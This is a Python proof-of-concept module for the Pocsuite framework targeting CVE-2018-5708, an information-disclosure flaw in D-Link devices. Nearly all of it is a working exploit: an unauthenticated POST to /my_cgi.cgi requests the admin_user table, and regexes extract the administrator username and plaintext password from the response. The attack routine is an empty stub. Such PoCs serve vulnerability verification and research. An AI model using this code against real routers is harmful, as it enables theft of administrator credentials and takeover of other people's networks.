#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import re

class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['Hcamael']
    vulDate = '2018-01-22'
    createDate = '2018-01-26'
    updateDate = '2018-01-26'
    references = ['']
    name = 'D-Link CVE-2018-5708信息泄露漏洞'
    appPowerLink = ''
    appName = 'D-link'
    appVersion = ''
    vulType = '信息泄露'
    desc = '''
    '''
    samples = ['']
    install_requires = ['']
    #请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def _attack(self):
        result = {}
        return self.parse_output(result)

    def _verify(self):
        result = {}
        url = self.url + "/my_cgi.cgi"
        data = "request=no_auth&request=load_settings&table_name=admin_user"
        r = req.post(url, data=data)
        if "</admin_user_name>" in r.content:
            admin = re.findall("<admin_user_name>(\w+)</admin_user_name>", r.content)
            passwd = re.findall("<admin_user_pwd>(\w+)</admin_user_pwd>", r.content)
            admin = [admin[0] if len(admin) > 0 else ""][0]
            passwd = [passwd[0] if len(passwd) > 0 else ""][0]
            if admin != "" or passwd != "":
                result["VerifyInfo"] = {}
                result["VerifyInfo"]["URL"] = self.url
                result["VerifyInfo"]["USER"] = admin
                result["VerifyInfo"]["PASSWD"] = passwd
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
